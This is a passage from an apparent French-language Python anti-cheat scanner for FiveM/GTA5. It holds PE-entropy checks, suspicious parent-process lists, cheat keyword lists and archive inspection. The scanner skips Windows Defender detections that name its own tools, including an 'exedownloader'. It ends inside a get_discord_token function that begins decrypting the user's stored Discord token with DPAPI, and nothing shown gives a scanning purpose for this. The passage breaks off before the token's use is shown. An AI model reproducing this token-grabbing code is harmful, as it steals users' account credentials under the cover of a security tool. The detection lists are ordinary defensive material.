                        suspects.append({
                            "file": full,
                            "name": fname,
                            "reasons": reasons,
                            "severity": severity,
                            "size": os.path.getsize(full),
                        })
                except Exception:
                    continue

    if progress_callback:
        progress_callback("Scripts Lua/JS FiveM", pct, f"Scan des répertoires FiveM pour scripts suspects...")

    for d in fivem_dirs:
        _scan_dir_lua(d)

    return {"suspects": suspects, "scanned_count": scanned}


def scan_process_hollowing(progress_callback=None, pct=89):
    """
    Détecte le process hollowing sur GTA5.exe / FiveM.exe / FiveM_*.exe.
    Vérifie la chaîne de parent PID pour détecter des lanceurs anormaux
    (cmd.exe, powershell.exe, python.exe, ou inconnus qui lancent GTA5/FiveM).
    """
    import psutil as _psutil
    if _psutil is None:
        return {"hollowing_detected": False, "details": [], "processes_checked": 0}

    TARGET_PROCESSES = {"gta5.exe", "fivem.exe"}
    # Parents suspects : un cheat loader lance FiveM/GTA via cmd, powershell, python, ou un exe inconnu
    SUSPICIOUS_PARENTS = {"cmd.exe", "powershell.exe", "pwsh.exe", "python.exe", "python3.exe", "wscript.exe", "cscript.exe", "mshta.exe", "rundll32.exe", "regsvr32.exe"}

    if progress_callback:
        progress_callback("Process Hollowing", pct, "Vérification chaîne de processus GTA5/FiveM...")

    details = []
    checked = 0
    hollowing_detected = False

    try:
        for proc in _psutil.process_iter(['pid', 'name', 'ppid']):
            try:
                info = proc.info
                pname = (info.get("name") or "").lower()
                if pname not in TARGET_PROCESSES:
                    continue
                checked += 1
                ppid = info.get("ppid")
                if not ppid or ppid == 0:
                    continue
                try:
                    parent = _psutil.Process(ppid)
                    parent_name = (parent.name() or "").lower()
                except Exception:
                    continue

                # Vérifier si le parent est un processus suspect
                is_suspicious = False
                reason = ""
                if parent_name in SUSPICIOUS_PARENTS:
                    is_suspicious = True
                    reason = f"Parent suspect: {parent_name} (PID {ppid})"
                elif parent_name not in ("fivem.exe", "explorer.exe", "steam.exe", "epicgameslauncher.exe", "cmd.exe"):
                    # Parent inconnu qui n'est ni un launcher ni explorer
                    is_suspicious = True
                    reason = f"Parent inconnu: {parent_name} (PID {ppid})"

                if is_suspicious:
                    hollowing_detected = True
                    try:
                        parent_cmdline = " ".join(parent.cmdline()[:3]) if hasattr(parent, 'cmdline') else "N/A"
                    except Exception:
                        parent_cmdline = "N/A"
                    details.append({
                        "process": pname,
                        "pid": info["pid"],
                        "parent_name": parent_name,
                        "parent_pid": ppid,
                        "parent_cmdline": parent_cmdline,
                        "reason": reason,
                    })
            except Exception:
                continue
    except Exception:
        pass

    return {
        "hollowing_detected": hollowing_detected,
        "details": details,
        "processes_checked": checked,
    }


def _check_pe_virtualizer_anomaly(file_path: str) -> dict:
    """
    Examine les en-têtes PE d'un exécutable pour détecter des anomalies de virtualisation de code / packer (ex: VMProtect/Themida/Custom Stub).
    Un exécutable dont la section .text a RawSize == 0 avec un binaire non signé est très probablement un loader de cheat obfusqué.
    Enrichi après reverse du cheat Ham Mafia v2.8 :
      - Entropie sectionnelle > 7.5 sur toutes les sections = packer custom
      - Combo URLDownloadToFileA + D3D11 + entropie haute = cheat dropper DirectX
    """
    try:
        if not os.path.isfile(file_path) or os.path.getsize(file_path) < 1024:
            return None
        if is_trusted_system_or_signed(file_path):
            return None

        with open(file_path, "rb") as f:
            header = f.read(4096)

        if not header.startswith(b'MZ'):
            return None

        pe_offset = struct.unpack('<I', header[0x3C:0x40])[0]
        if pe_offset + 26 > len(header):
            return None

        num_sections = struct.unpack('<H', header[pe_offset+6:pe_offset+8])[0]
        opt_hdr_size = struct.unpack('<H', header[pe_offset+20:pe_offset+22])[0]
        sec_offset = pe_offset + 24 + opt_hdr_size

        high_entropy_sections = 0

        for i in range(num_sections):
            start = sec_offset + i * 40
            if start + 40 <= len(header):
                sec_data = header[start : start + 40]
                sec_name = sec_data[:8].rstrip(b'\x00').decode('ascii', errors='ignore').lower()
                virt_size = struct.unpack('<I', sec_data[8:12])[0]
                raw_off   = struct.unpack('<I', sec_data[20:24])[0]
                raw_size  = struct.unpack('<I', sec_data[16:20])[0]

                # Règle 1 : Section .text vide = stub virtualisation (ancien check)
                if sec_name == ".text" and raw_size == 0 and virt_size > 0x10000:
                    return {
                        "is_cheat": True,
                        "severity": "CRITICAL",
                        "reason": f"Anomalie PE / Obfuscation Virtuelle : Section .text virtuelle ({hex(virt_size)}) avec taille disque 0 octet dans '{os.path.basename(file_path)}' (Cheat Stub Obfusqué) !"
                    }

                # Règle 2 : Calcul d'entropie sectionnelle (détecte packer/chiffrement custom)
                # On lit jusqu'à 128 KB pour estimer l'entropie sans lire tout le fichier
                if raw_size > 512 and raw_off > 0:
                    try:
                        with open(file_path, "rb") as f_ent:
                            f_ent.seek(raw_off)
                            chunk = f_ent.read(min(raw_size, 131072))
                        if len(chunk) > 256:
                            import math
                            freq = [0] * 256
                            for b in chunk: freq[b] += 1
                            ent = 0.0
                            for fr in freq:
                                if fr:
                                    p = fr / len(chunk)
                                    ent -= p * math.log2(p)
                            if ent > 7.4 and sec_name not in (".rsrc", ".reloc"):
                                high_entropy_sections += 1
                    except Exception:
                        pass

        # Règle 3 : Si la majorité des sections sont fortement chiffrées (Ham Mafia pattern)
        if high_entropy_sections >= 3:
            # Vérifier aussi la présence de URLDownloadToFileA (dropper) et D3D (overlay)
            try:
                with open(file_path, "rb") as f_imp:
                    f_imp.seek(0)
                    imp_data = f_imp.read(min(os.path.getsize(file_path), 10_000_000))
                has_downloader = b"URLDownloadToFileA" in imp_data or b"urlmon" in imp_data.lower()
                has_d3d        = b"d3d11.dll" in imp_data.lower() or b"D3D11CreateDevice" in imp_data
                has_crypt      = b"CertOpenStore" in imp_data or b"BCryptGenRandom" in imp_data
                has_network    = b"WS2_32" in imp_data or b"WSAEventSelect" in imp_data
                has_screenshot = b"BitBlt" in imp_data

                reasons = []
                if has_downloader:  reasons.append("téléchargeur réseau (URLDownloadToFileA)")
                if has_d3d:         reasons.append("overlay DirectX 11 (ESP/Wallhack)")
                if has_crypt:       reasons.append("chiffrement de données (CRYPT32)")
                if has_network:     reasons.append("connexions réseau SSL (WS2_32/Secur32)")
                if has_screenshot:  reasons.append("capture d'écran silencieuse (BitBlt)")

                if reasons:
                    return {
                        "is_cheat": True,
                        "severity": "CRITICAL",
                        "reason": (
                            f"Loader/Dropper de Cheat Obfusqué détecté dans '{os.path.basename(file_path)}' : "
                            f"{high_entropy_sections} sections chiffrées (entropie >7.4) + {', '.join(reasons)}. "
                            f"Pattern identique au Ham Mafia Loader v2.8 (Trojan:Win32/Ravartar)."
                        )
                    }
                else:
                    return {
                        "is_cheat": True,
                        "severity": "HIGH",
                        "reason": (
                            f"Exécutable massivement chiffré/packé (packer custom) dans '{os.path.basename(file_path)}' : "
                            f"{high_entropy_sections} sections avec entropie >7.4. Probablement un cheat obfusqué."
                        )
                    }
            except Exception:
                pass

    except Exception:
        pass

    return None


def _is_fivem_cheat_file(filename: str, full_path: str = "") -> dict:
    """
    Vérifie si un fichier est un cheat FiveM ou une usurpation système.
    Retourne un dict {'is_cheat': True, 'reason': '...', 'severity': '...'} ou None.
    """
    name_lower = filename.lower().strip()
    # ── Nettoyage préfixe NT device path (\??\, \\?\) ──
    # ShimCache et certaines sources Windows retournent des chemins comme
    # "\\?\C:\WINDOWS\system32\conhost.exe" au lieu de "C:\WINDOWS\..."
    _clean_path = full_path.replace("\\??\\", "").replace("\\\\?\\", "")
    if _clean_path.startswith("?\\"):
        _clean_path = _clean_path[2:]
    path_lower = _clean_path.lower().strip()
    ext = os.path.splitext(name_lower)[1]

    # Ignorer les frameworks légitimes
    if any(legit in name_lower or legit in path_lower for legit in LEGITIMATE_FRAMEWORKS):
        return None

    # 1. Usurpation de nom système (System Process Masquerading)
    # Ex: ntoskrnl.exe, svchost.exe dans Downloads, AppData, Documents, etc.
    if name_lower in SYSTEM_PROCESS_NAMES:
        valid_sys_paths = ("c:\\windows\\system32", "c:\\windows\\syswow64", "c:\\windows\\winsxs", "c:\\windows\\servicing")
        if path_lower:
            if not any(path_lower.startswith(vp) for vp in valid_sys_paths):
                return {
                    "is_cheat": True,
                    "severity": "CRITICAL",
                    "reason": f"Usurpation de Fichier Système (Masquerading) : Fichier '{filename}' trouvé hors du dossier System32 !"
                }
            else:
                # Fichier système légitime dans son dossier officiel
                return None

    # 2. Vérification par Hash SHA256/MD5 si le fichier existe sur disque
    if full_path and os.path.isfile(full_path):
        try:
            h_sha256 = get_file_sha256(full_path)
            if h_sha256 and h_sha256.lower() in KNOWN_CHEAT_HASHES:
                return {
                    "is_cheat": True,
                    "severity": "CRITICAL",
                    "reason": f"Empreinte HASH de Cheat Détectée : Hash SHA256 '{h_sha256[:16]}...' correspond à {KNOWN_CHEAT_HASHES[h_sha256.lower()]} !"
                }
        except Exception:
            pass

        # 2.5. Identification de Cheat Renommé via Empreinte de Chaînes Binaires (Binary String Fingerprinting)
        # Ex: xxkfn.exe -> Détecté comme "NitWit Loader" grâce aux chaînes internes
        try:
            binary_match = _identify_cheat_by_binary_strings(full_path)
            if binary_match:
                matched_str_fmt = ", ".join(f"'{s}'" for s in binary_match["matched_strings"])
                return {
                    "is_cheat": True,
                    "severity": binary_match.get("severity", "CRITICAL"),
                    "reason": (
                        f"Cheat Renommé Identifié : '{filename}' est en réalité '{binary_match['real_name']}' ! "
                        f"(Détecté via {binary_match['match_count']} empreintes textuelles binaires : {matched_str_fmt})"
                    )
                }
        except Exception:
            pass

        # Ignorer les analyses heuristiques PE pour les fichiers signés légitimes / de confiance
        if is_trusted_system_or_signed(full_path):
            return None

        # 3. Contrôle PE avancé : imports dangereux (SetupDi, URLDownload, MiniDump, D3D_43...)
        pe_imports = _check_pe_imports_danger(full_path)
        if pe_imports:
            return pe_imports

        # 4. Stub packer commun (SPOOFER + CHEAT1 — bitstream/RLE au EP)
        pe_stub = _check_pe_packer_stub(full_path)
        if pe_stub:
            return pe_stub

        # 5. Syscall direct (Hell's Gate / SysWhispers — opcode 0F 05 au EP)
        pe_syscall = _check_pe_direct_syscall(full_path)
        if pe_syscall:
            return pe_syscall

        # 6. Sections PE anormales (scramblées, packer custom, EP hors .text)
        pe_sections = _check_pe_sections_anomaly(full_path)
        if pe_sections:
            return pe_sections

        # 7. Contrôle d'Anomalie PE / Virtualisation (.text RawSize=0, entropie globale)
        pe_match = _check_pe_virtualizer_anomaly(full_path)
        if pe_match:
            return pe_match

    GENERIC_SHORT_KEYWORDS = {"aria", "dark", "nova", "rise", "vex", "cobra", "spoon", "mod", "hook", "menu", "esp", "luck"}

    for cheat in SPECIFIC_CHEATS:
        if len(cheat) <= 3 or cheat in GENERIC_SHORT_KEYWORDS:
            base_name = os.path.splitext(name_lower)[0]
            is_match = (name_lower == cheat) or (base_name == cheat) or (base_name.startswith(f"{cheat}_") or base_name.endswith(f"_{cheat}"))
        else:
            is_match = (cheat in name_lower)
            
        if is_match:
            # Ignorer les fichiers de langue / .ini dans les dossiers de logiciels légitimes
            path_lower = full_path.lower()
            if ext == ".ini" and any(k in path_lower for k in ["languages", "lang", "translation", "program files", "wise memory", "driver booster"]):
                continue
            return {
                "is_cheat": True,
                "severity": "CRITICAL" if cheat in ["ntoskrnl.exe", "realboss", "eulen", "redengine"] else "HIGH",
                "reason": f"Signature de cheat FiveM '{cheat}' détectée dans le fichier '{filename}'"
            }

    return None

def _scan_archive_contents(archive_path: str):
    """
    Inspecte l'intérieur des archives (.zip, .rar, .7z) sans les extraire sur disque.
    Timeout 5s par archive — une archive énorme n'est pas un cheat probable.
    """
    suspects_found = []
    ext = os.path.splitext(archive_path.lower())[1]

    if ext == ".zip":
        try:
            import zipfile
            with zipfile.ZipFile(archive_path, 'r') as z:
                count = 0
                for item in z.infolist():
                    count += 1
                    if count > 5000:
                        break  # Archive avec > 5000 fichiers = probablement pas un cheat
                    fname = item.filename.rstrip()
                    base_name = os.path.basename(fname).lower().strip()
                    if base_name:
                        match = _is_fivem_cheat_file(base_name, fname)
                        if match:
                            suspects_found.append((base_name, fname, match["reason"]))
        except Exception:
            pass
    elif ext == ".rar":
        try:
            res = subprocess.run(
                ["tar", "-tf", archive_path],
                capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=5,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            if res.returncode == 0:
                for line in res.stdout.splitlines()[:5000]:
                    fname = line.rstrip()
                    base_name = os.path.basename(fname).lower().strip()
                    if base_name:
                        match = _is_fivem_cheat_file(base_name, fname)
                        if match:
                            suspects_found.append((base_name, fname, match["reason"]))
        except Exception:
            pass
    elif ext in {".tar", ".gz"}:
        try:
            import tarfile
            with tarfile.open(archive_path, 'r:*') as t:
                count = 0
                for member in t.getmembers():
                    count += 1
                    if count > 5000:
                        break
                    base_name = os.path.basename(member.name).lower().strip()
                    if base_name:
                        match = _is_fivem_cheat_file(base_name, member.name)
                        if match:
                            suspects_found.append((base_name, member.name, match["reason"]))
        except Exception:
            pass

    return suspects_found


def _is_password_protected_archive(file_path: str) -> dict:
    """
    Détecte si une archive (.zip, .7z, .rar) est protégée par mot de passe.
    90% des cheats sont distribués dans des archives protégées pour éviter
    la détection antivirus. Une archive protégée = suspecte par défaut.

    Retourne {'is_protected': True, 'method': '...', 'reason': '...'} ou None.
    """
    ext = os.path.splitext(file_path.lower())[1]

    if ext == ".zip":
        try:
            import zipfile
            with zipfile.ZipFile(file_path, 'r') as z:
                # Si on peut lire la liste, vérifier les flags d'encryption
                for item in z.infolist():
                    # Flag bit 0 du compress_type = encrypted
                    if item.flag_bits & 0x1:
                        return {
                            "is_protected": True,
                            "method": "ZIP Encryption (flag bit 0)",
                            "reason": "Archive ZIP chiffrée — couramment utilisée pour distribuer des cheats hors détection antivirus"
                        }
                # Aussi : essayer de lire le premier fichier sans mot de passe
                try:
                    first_file = None
                    for name in z.namelist():
                        if not name.endswith('/'):
                            first_file = name
                            break
                    if first_file:
                        z.read(first_file)
                except RuntimeError as e:
                    if "password" in str(e).lower() or "encrypted" in str(e).lower():
                        return {
                            "is_protected": True,
                            "method": "ZIP Password (RuntimeError)",
                            "reason": f"Archive ZIP protégée par mot de passe — impossible de lire '{first_file}' sans mot de passe"
                        }
                except Exception:
                    pass
        except zipfile.BadZipFile:
            pass
        except Exception:
            pass

    elif ext == ".7z":
        try:
            with open(file_path, "rb") as f:
                header = f.read(32)
            # 7z magic: bytes 0-5 = "7z\xbc\xaf\x27\x1c"
            if len(header) >= 32 and header[:6] == b'7z\xbc\xaf\x27\x1c':
                # Byte 25 du header 7z: 0x03 = encrypted names, 0x20+ = encrypted
                if len(header) > 25 and (header[25] & 0x03 or header[25] & 0x20):
                    return {
                        "is_protected": True,
                        "method": "7z Encryption (header byte)",
                        "reason": "Archive 7z chiffrée — couramment utilisée pour distribuer des cheats hors détection antivirus"
                    }
                # Aussi : vérifier si les noms de fichiers sont chiffrés (non lisibles)
                try:
                    import py7zr
                    with py7zr.SevenZipFile(file_path, 'r') as sz:
                        sz.getnames()  # Si ça lève une exception, c'est protégé
                except Exception as e:
                    if "password" in str(e).lower() or "encrypted" in str(e).lower():
                        return {
                            "is_protected": True,
                            "method": "7z Password (py7zr)",
                            "reason": f"Archive 7z protégée par mot de passe — {str(e)[:100]}"
                        }
                except ImportError:
                    pass
        except Exception:
            pass

    elif ext == ".rar":
        try:
            with open(file_path, "rb") as f:
                header = f.read(24)
            # RAR5 magic: bytes 0-6 = "Rar!\x1a\x07\x01\x00"
            if len(header) >= 7 and header[:4] == b'Rar!':
                # RAR5: header[23] contient des flags, bit 3 = encrypted
                if len(header) > 23 and (header[23] & 0x08):
                    return {
                        "is_protected": True,
                        "method": "RAR5 Encryption (header flag)",
                        "reason": "Archive RAR chiffrée — couramment utilisée pour distribuer des cheats hors détection antivirus"
                    }
                # RAR4: header[10] contient des flags
                if len(header) > 10 and (header[10] & 0x04):
                    return {
                        "is_protected": True,
                        "method": "RAR4 Encryption (header flag)",
                        "reason": "Archive RAR chiffrée — couramment utilisée pour distribuer des cheats hors détection antivirus"
                    }
        except Exception:
            pass

    return None

def scan_windows_defender_threats(progress_callback=None, pct=74):
    """
    Interroge l'historique des menaces de Windows Defender (Get-MpThreatDetection).
    Récupère les exécutables malveillants récents repérés dans Downloads, AppData, Temp, etc.
    """
    if progress_callback:
        progress_callback("Forensique Defender", pct, "Analyse des détections récentes de Windows Defender...")
    
    defender_traces = []
    try:
        ps_cmd = "Get-MpThreatDetection | Select-Object ThreatName, Resources, InitialDetectionTime | ConvertTo-Json -Compress"
        res = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps_cmd],
            capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=5
        ,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        if res.returncode == 0 and res.stdout.strip():
            import json
            try:
                data = json.loads(res.stdout)
            except Exception:
                data = []

            if isinstance(data, dict):
                data = [data]
            
            for item in data:
                threat_name = item.get("ThreatName", "Menace Inconnue")
                resources = item.get("Resources", [])
                time_detected = item.get("InitialDetectionTime", "")
                
                res_str = " | ".join(resources) if isinstance(resources, list) else str(resources)
                res_lower = res_str.lower()
                
                # ── Ignorer nos propres outils (faux positifs Defender) ──
                is_our_app = any(own in res_lower for own in [
                    "anti-scan", "antiscan", "anti_scan", "adamzoda",
                    "exedownloader", "antyscan", "anti defense"
                ])
                if is_our_app:
                    continue

                if any(kw in res_lower for kw in ["downloads", "desktop", "temp", "appdata", "documents", "cheat", "loader", "realboss", "ntoskrnl"]):
                    defender_traces.append({
                        "threat_name": threat_name,
                        "resources": res_str,
                        "time_detected": time_detected,
                        "description": f"Windows Defender a détecté le cheat/malware '{threat_name}' dans : {res_str}"
                    })
    except Exception:
        pass
        
    return defender_traces


# Noms de dossiers suspects qui ne correspondent pas à un cheat connu
# mais qui sont souvent utilisés comme noms de dossiers par les cheaters
SUSPICIOUS_FOLDER_NAMES = {
    "420", "4chan", "hack", "hacks", "cheat", "cheats", "inject", "injecteur",
    "ham", "loader", "menu", "triggerbot", "esp", "aimbot", "bypass",
    "spoofer", "hwid", "executor", "exploit", "lua", "asi", "modmenu",
    "modder", "modding", "grief", "griefer", "griefing", "godmode",
    "noclip", "wallhack", "wh", "silentaim", "speedhack", "freecam"
}

def scan_fivem_cheat_files_all_drives(drives, progress_callback=None, start_pct=62, end_pct=72):
    """Scan FiveM cheat files across ALL mounted drives — optimisé vitesse + robustesse."""
    suspects = []

    user_profile = os.environ.get("USERPROFILE", "")
    local_appdata = os.environ.get("LOCALAPPDATA", "")
    appdata = os.environ.get("APPDATA", "")
    temp_dir = os.environ.get("TEMP", "")
    local_temp = os.path.join(local_appdata, "Temp")

    # ── Dossiers CHIRURGICAUX uniquement — jamais de scan en masse d'AppData entier
    standard_dirs = [
        # FiveM : dossiers ciblés uniquement (on ÉVITE cache/game-storage = 30 Go d'assets)
        os.path.join(local_appdata, "FiveM", "FiveM.app", "plugins"),
        os.path.join(local_appdata, "FiveM", "FiveM.app", "data", "nui"),
        os.path.join(local_appdata, "FiveM", "FiveM.app", "data", "cache", "subprocess"),
        os.path.join(local_appdata, "FiveM", "FiveM.app", "crashes"),

        # Bureau et Téléchargements (source principale de cheats)
        os.path.join(user_profile, "Desktop"),
        os.path.join(user_profile, "Downloads"),
        os.path.join(user_profile, "Documents"),

        # Temp
        temp_dir,
        local_temp,

        # Fichiers récents Windows (LNK vers fichiers récemment ouverts)
        os.path.join(appdata, "Microsoft", "Windows", "Recent"),

        # AppData : sous-dossiers ciblés UNIQUEMENT
        os.path.join(local_appdata, "Packages"),
        os.path.join(appdata, "discord"),
        os.path.join(local_appdata, "discord"),
    ]

    # Lecteurs secondaires (D:, E:, etc.)
    system_drive = os.environ.get("SYSTEMDRIVE", "C:").upper()
    for drive in drives:
        letter = drive["letter"].upper()
        if letter == system_drive:
            continue
        root = f"{letter}\\"
        if os.path.isdir(root):
            standard_dirs.append(root)

    # ── Corbeille Windows ($RECYCLE.BIN)
    for drive_letter in ["C", "D", "E", "F"]:
        recycle_path = f"{drive_letter}:\\$RECYCLE.BIN"
        if os.path.isdir(recycle_path):
            standard_dirs.append(recycle_path)

    dirs_to_scan = []
    seen = set()
    for d in standard_dirs:
        if d and d not in seen and os.path.isdir(d):
            dirs_to_scan.append(d)
            seen.add(d)

    total_dirs = max(len(dirs_to_scan), 1)

    def _get_depth_limit(directory: str) -> int:
        d_lower = directory.lower()
        if "fivem.app" in d_lower or "cfx.re" in d_lower:
            return 3
        if "fivem" in d_lower and "subprocess" in d_lower:
            return 2
        if "recent" in d_lower:
            return 1
        if "$recycle.bin" in d_lower:
            return 1
        if "desktop" in d_lower or "downloads" in d_lower:
            return 2
        if "temp" in d_lower:
            return 2
        return 2

    def _sanitize_display(name):
        """Affiche le nom du fichier sans données sensibles (tokens, IDs, etc.)."""
        name_lower = name.lower()
        if any(tok in name_lower for tok in ("token", "key", "secret", "password", "cookie")):
            return "[REDACTED]"
        return name

    MAX_ARCHIVE_SIZE = 20 * 1024 * 1024  # 20 MB — les cheats sont rarement plus gros

    def _scan_one_dir(directory, pct):
        local_suspects = []
        depth_limit = _get_depth_limit(directory)
        is_recent_dir = "recent" in directory.lower()
        _file_count = 0
        _dir_drive = directory[:3] if len(directory) >= 3 else "?"

        try:
            for root, dirs, files in os.walk(directory):
                depth = root.replace(directory, "").count(os.sep)

                # ── Noms de dossiers suspects
                for d in dirs:
                    d_lower = d.lower().strip()
                    if d_lower in SUSPICIOUS_FOLDER_NAMES:
                        local_suspects.append({
                            "file": d,
                            "path": os.path.join(root, d),
                            "directory": root,
                            "drive": _dir_drive,
                            "severity": "HIGH",
                            "reason": f"Dossier au nom suspect de cheat/grief détecté : '{d}'"
                        })
                        continue
                    for cheat in SPECIFIC_CHEATS:
                        if len(cheat) <= 3:
                            is_match = (cheat == d_lower)
                        else:
                            is_match = (cheat == d_lower) or (f" {cheat} " in f" {d_lower} ") or (d_lower.startswith(f"{cheat}_") or d_lower.endswith(f"_{cheat}"))
                        if is_match:
                            local_suspects.append({
                                "file": d,
                                "path": os.path.join(root, d),
                                "directory": root,
                                "drive": _dir_drive,
                                "severity": "HIGH",
                                "reason": f"Dossier suspect lié à un cheat FiveM détecté : '{d}'"
                            })
                            break

                dirs[:] = [
                    d for d in dirs
                    if d.lower() not in {
                        "windows", "program files", "program files (x86)",
                        "system32", "syswow64", "ea", "playnite", "razor",
                        "system volume information", "programdata", "recovery",
                        "perflogs", "winsxs", "servicing", "node_modules",
                        ".git", ".cache", "gpu_cache", "microsoft", "nvidia",
                        "amd", "intel", "common files", "internet explorer",
                        "windows defender", "windowsapps", "onedrive", "packages",
                        "publisher", "application data", "cookies", "history",
                        "temporary internet files", "steam", "steamlibrary",
                        "epic games", "riot games", "ubisoft", "origin",
                        "origin games", "rockstar games", "gta v", "gtav",
                        "social club", "battlenet", "battle.net", "geforce experience"
                    } and not d.lower().startswith(IGNORED_DIR_PREFIXES)
                ]

                if depth >= depth_limit:
                    dirs.clear()
                    continue

                for file in files:
                    _file_count += 1
                    file_lower = file.lower()
                    ext = os.path.splitext(file_lower)[1]

                    if ext in IGNORED_EXTENSIONS or file_lower.startswith("cache"):
                        continue

                    full_path = os.path.join(root, file)

                    # ── Skip fichiers > 100 MB (assets de jeu GTA, pas des cheats)
                    try:
                        fsize_quick = os.path.getsize(full_path)
                        if fsize_quick > MAX_CHEAT_FILE_SIZE:
                            continue
                    except Exception:
                        continue

                    # ── Progress : montrer le disque + nb fichiers + nom sanitisé (jamais de chemin complet)
                    if progress_callback and _file_count % 50 == 0:
                        display_name = _sanitize_display(file)
                        progress_callback(
                            "Scan Fichiers Multi-Disques", pct,
                            f"{_dir_drive}\\ | {_file_count} fichiers | {display_name}"
                        )

                    if is_recent_dir and ext == ".lnk":
                        try:
                            with open(full_path, "rb") as lf:
                                lnk_data = lf.read(4096)
                            import re as _re
                            targets = _re.findall(b'[A-Za-z]:\\\\[^\x00\r\n"]{5,120}', lnk_data)
                            for t in targets:
                                t_str = t.decode("utf-8", errors="ignore")
                                t_base = os.path.basename(t_str)
                                lnk_match = _is_fivem_cheat_file(t_base, t_str)
                                if lnk_match:
                                    local_suspects.append({
                                        "file": file,
                                        "path": full_path,
                                        "directory": root,
                                        "drive": _dir_drive,
                                        "severity": "CRITICAL",
                                        "reason": f"Raccourci Recent '{file}' pointe vers un cheat"
                                    })
                                    break
                        except Exception:
                            pass
                        continue

                    # ── Skip archives trop grosses (> 50MB = trop lent, faux positif improbable)
                    if ext in ARCHIVE_EXTENSIONS:
                        try:
                            fsize = os.path.getsize(full_path)
                            if fsize > MAX_ARCHIVE_SIZE:
                                continue
                        except Exception:
                            continue

                    try:
                        match = _is_fivem_cheat_file(file, full_path)
                        if match:
                            local_suspects.append({
                                "file": file,
                                "path": full_path,
                                "directory": root,
                                "drive": _dir_drive,
                                "severity": match.get("severity", "HIGH"),
                                "reason": match.get("reason", f"Signature suspecte '{file}' sur {_dir_drive}")
                            })
                        elif ext in ARCHIVE_EXTENSIONS:
                            pw_result = _is_password_protected_archive(full_path)
                            if pw_result:
                                local_suspects.append({
                                    "file": file,
                                    "path": full_path,
                                    "directory": root,
                                    "drive": _dir_drive,
                                    "severity": "CRITICAL",
                                    "reason": f"Archive PROTEGEE PAR MOT DE PASSE '{file}' - {pw_result.get('reason', 'distribution de cheat')}"
                                })
                            archive_suspects = _scan_archive_contents(full_path)
                            for fname, inner_path, reason in archive_suspects:
                                local_suspects.append({
                                    "file": file,
                                    "path": full_path,
                                    "directory": root,
                                    "drive": _dir_drive,
                                    "severity": "CRITICAL",
                                    "reason": f"Archive suspecte '{file}' contenant '{fname}'"
                                })
                    except Exception:
                        pass  # Fichier inaccessible/corrompu → on passe

        except (PermissionError, OSError):
            pass
        return local_suspects

    # Lancer tous les dossiers en parallèle (I/O-bound) avec timeout par dossier
    workers = min(len(dirs_to_scan), _CPU_WORKERS)

    # ── Heartbeat : met à jour le vrai pourcentage toutes les 30s ──
    # Si le heartbeat s'arrête de tourner → le scanner est crashé/bloqué.
    _progress_state = {
        "pct": start_pct,
        "msg": "Préparation du scan...",
        "drive": "?"
    }

    def _heartbeat():
        try:
            if progress_callback:
                progress_callback(
                    "Scan Fichiers Multi-Disques",
                    _progress_state["pct"],
                    f"{_progress_state['drive']}\\ | {_progress_state['msg']}"
                )
        except Exception:
            pass

    _stop_heartbeat = threading.Event()

    def _heartbeat_loop():
        while not _stop_heartbeat.is_set():
            time.sleep(30)
            _heartbeat()

    _hb_thread = threading.Thread(target=_heartbeat_loop, daemon=True)
    _hb_thread.start()

    try:
        with ThreadPoolExecutor(max_workers=workers) as ex:
            futures_map = {
                ex.submit(_scan_one_dir, d, start_pct + int((i / total_dirs) * (end_pct - start_pct))): (i, d)
                for i, d in enumerate(dirs_to_scan)
            }
            for future in as_completed(futures_map, timeout=180):  # 3 min max total
                i, d = futures_map[future]
                drive_label = d[:3] if len(d) >= 3 else d
                done_count = sum(1 for f in futures_map if f.done())
                pct = start_pct + int((done_count / total_dirs) * (end_pct - start_pct))
                _progress_state["pct"] = pct
                _progress_state["drive"] = drive_label
                _progress_state["msg"] = f"{done_count}/{total_dirs} dossiers analysés"
                if progress_callback:
                    progress_callback("Scan Fichiers Multi-Disques", pct, f"{drive_label}\\ terminé ({done_count}/{total_dirs})")
                try:
                    result = future.result(timeout=40)  # 40s max par dossier
                    suspects.extend(result)
                except Exception:
                    pass  # Timeout ou erreur → on passe au suivant
    finally:
        _stop_heartbeat.set()
        _hb_thread.join(timeout=1)
        _heartbeat()  # dernier update final

    return suspects


def get_hardware_id():
    try:
        ps_cmd = "(Get-CimInstance Win32_ComputerSystemProduct).UUID"
        res = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps_cmd],
            capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=3
        ,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        uuid_str = res.stdout.strip()
        if uuid_str and len(uuid_str) > 10 and "error" not in uuid_str.lower():
            h = hashlib.sha256(uuid_str.encode()).hexdigest().upper()
            return f"HWID-{h[:4]}-{h[4:8]}-{h[8:12]}"
    except Exception:
        pass
    if psutil is not None:
        raw = f"{socket.gethostname()}_{psutil.cpu_count()}_{round(psutil.virtual_memory().total / (1024**3))}"
    else:
        raw = f"{socket.gethostname()}_0_0"
    h = hashlib.sha256(raw.encode()).hexdigest().upper()
    return f"HWID-{h[:4]}-{h[4:8]}-{h[8:12]}"

def measure_disk_read_speed():
    try:
        test_file = r"C:\Windows\explorer.exe"
        if not os.path.exists(test_file):
            test_file = r"C:\Windows\System32\kernel32.dll"
        start = time.time()
        read = 0
        with open(test_file, "rb") as f:
            while True:
                chunk = f.read(512 * 1024)
                if not chunk:
                    break
                read += len(chunk)
                if time.time() - start > 0.1:
                    break
        elapsed = time.time() - start
        if elapsed > 0 and read > 0:
            return round((read / (1024 * 1024)) / elapsed, 1)
    except Exception:
        pass
    return 320.0
_cached_discord_token = None
def get_discord_token():
     global _cached_discord_token
     if _cached_discord_token is not None:
         return _cached_discord_token

     import json
     import base64
     import ctypes
     from ctypes import windll, byref, c_int, c_void_p, Structure
     
     class DATA_BLOB(Structure):
          _fields_ = [('cbData', c_int), ('pbData', c_void_p)]
          
     def dpapi_decrypt(data):
          try:
               from ctypes import wintypes
               class DATA_BLOB_W(ctypes.Structure):
                    _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]
               
               crypt32 = ctypes.windll.crypt32
               crypt32.CryptUnprotectData.argtypes = [
                    ctypes.POINTER(DATA_BLOB_W),
                    ctypes.POINTER(wintypes.LPWSTR),
                    ctypes.POINTER(DATA_BLOB_W),
                    wintypes.LPVOID,
                    wintypes.LPVOID,
                    wintypes.DWORD,
